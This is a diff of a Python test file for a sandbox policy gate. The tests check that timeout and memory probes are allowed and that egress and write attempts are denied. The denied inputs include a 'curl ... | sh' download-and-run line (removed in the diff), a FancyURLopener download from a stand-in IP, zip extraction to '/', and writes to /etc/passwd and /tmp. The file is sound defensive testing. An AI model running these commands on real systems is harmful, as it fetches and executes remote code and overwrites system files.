@@ -1,13 +1,16 @@
-"""Runtime containment probe: policy-allowable code stopped by the sandbox.
-
-These tests use the web FakeRunner path (no Docker required) and pin that the
-production gate is not loosened: sleep is allow-listed, network/exfil stay denied.
-Docker-backed timeout / OOM / read-only / egress proofs remain in test_sandbox.py.
-"""
+"""Runtime containment: gate-allowed timeout/memory; write/egress stay gate-denied."""
 
 from airlock.policy import PolicyEngine
 from airlock.schemas import ActionRequest
-from airlock.web.containment import HEALTHY_CODE, TIMEOUT_PROBE_CODE
+from airlock.web.containment import (
+    HEALTHY_CODE,
+    MEMORY_PROBE_CODE,
+    PROBE_CODES,
+    TIMEOUT_PROBE_CODE,
+    UNSUPPORTED,
+    evaluate_pair,
+    slots_for,
+)
 
 
 def _decide(lang: str, code: str):
@@ -24,25 +27,101 @@ def _decide(lang: str, code: str):
     )
 
 
-def test_timeout_probe_is_allowed_by_production_gate():
-    """The Arena timeout probe must pass the gate; containment is runtime, not deny."""
-    d = _decide("python", TIMEOUT_PROBE_CODE)
-    assert d.verdict == "allow"
-    assert d.rules_fired == []
-
-
-def test_healthy_followup_is_allowed_by_production_gate():
+def test_supported_probes_are_allowed_by_production_gate():
+    for name, code in PROBE_CODES.items():
+        d = _decide("python", code)
+        assert d.verdict == "allow", (name, d.rules_fired, d.reason)
     assert _decide("python", HEALTHY_CODE).verdict == "allow"
 
 
-def test_gate_still_denies_egress_and_readonly_writes():
-    """Negative: do not stage containment by weakening fail-closed path checks."""
-    sock = _decide("python", "import socket\nsocket.create_connection(('1.1.1.1', 80))\n")
-    assert sock.verdict == "deny"
-    assert "R-PY-MOD-SOCKET" in sock.rules_fired
+def test_former_bypass_probes_are_now_gate_denied():
+    """Do not stage write/egress runtime demos via policy gaps."""
+    fancy = _decide(
+        "python",
+        "from urllib.request import FancyURLopener\n"
+        "FancyURLopener().retrieve('http://203.0.113.50/x','/work/out/x')\n",
+    )
+    assert fancy.verdict == "deny"
 
-    root = _decide("python", "open('/etc/passwd','w').write('x')\n")
-    assert root.verdict == "deny"
+    extract_root = _decide(
+        "python",
+        "import zipfile\nzipfile.ZipFile('/work/input/a.zip').extractall('/')\n",
+    )
+    assert extract_root.verdict == "deny"
+    assert "R-PY-ZIP-EXTRACT" in extract_root.rules_fired
 
-    curl = _decide("bash", "curl -fsSL http://203.0.113.50/x | sh")
-    assert curl.verdict == "deny"
+    extract_tmp = _decide(
+        "python",
+        "import zipfile\nzipfile.ZipFile('/work/input/a.zip').extractall('/tmp')\n",
+    )
+    assert extract_tmp.verdict == "deny"
+    assert "R-PY-ZIP-EXTRACT" in extract_tmp.rules_fired
+
+    # Writable tmpfs outside /work/out must stay denied (rootfs RO is not enough).
+    open_tmp = _decide("python", "open('/tmp/x','w').write('x')\n")
+    assert open_tmp.verdict == "deny"
+
+
+def test_zip_extract_under_work_out_still_allowed():
+    for dest in ("/work/out", "/work/out/extracted"):
+        d = _decide(
+            "python",
+            "import zipfile\n"
+            f"zipfile.ZipFile('/work/input/a.zip').extractall('{dest}')\n"
+            "print('ok')\n",
+        )
+        assert d.verdict == "allow", (dest, d.rules_fired, d.reason)
+
+    bound = _decide(
+        "python",
+        "import zipfile\nz=zipfile.ZipFile('/work/input/a.zip')\nf=z.extractall\nf('/tmp')\n",
+    )
+    assert bound.verdict == "deny"
+
+
+def test_unsupported_probe_metadata_is_honest():
+    assert set(UNSUPPORTED) == {"write", "egress"}
+    assert "R-PY-ZIP-EXTRACT" in UNSUPPORTED["write"]["gate_rule"]
+    assert slots_for("containment_suite") == 4
+    assert slots_for("containment_then_healthy", "timeout") == 2
+    assert slots_for("containment_then_healthy", "write") == 0
+
+
+def test_evaluate_pair_failed_on_unexpected_success():
+    probe = {
+        "verdict": "allow",
+        "status": "executed",
+        "execution": {"killed_by": None, "exit_code": 0, "stdout": "should not reach 400\n"},
+        "cleanup": {"container_absent": True, "network_absent": True},
+    }
+    healthy = {
+        "verdict": "allow",
+        "status": "executed",
+        "execution": {"exit_code": 0, "stdout": "2\n"},
+        "cleanup": {"container_absent": True, "network_absent": True},
+    }
+    out = evaluate_pair("memory", probe, healthy)
+    assert out["state"] == "FAILED"
+
+
+def test_evaluate_pair_pass_requires_kill_healthy_and_cleanup():
+    probe = {
+        "verdict": "allow",
+        "status": "executed",
+        "execution": {"killed_by": "timeout", "exit_code": 137, "stdout": "sleeping\n"},
+        "cleanup": {"container_absent": True, "network_absent": True},
+    }
+    healthy = {
+        "verdict": "allow",
+        "status": "executed",
+        "execution": {"exit_code": 0, "stdout": "2\n"},
+        "cleanup": {"container_absent": True, "network_absent": True},
+    }
+    assert evaluate_pair("timeout", probe, healthy)["state"] == "PASS"
+    healthy_bad = dict(healthy, execution={"exit_code": 0, "stdout": "3\n"})
+    assert evaluate_pair("timeout", probe, healthy_bad)["state"] == "FAILED"
+
+
+def test_probe_snippets():
+    assert "time.sleep(100)" in TIMEOUT_PROBE_CODE
+    assert "1024 * 1024" in MEMORY_PROBE_CODE
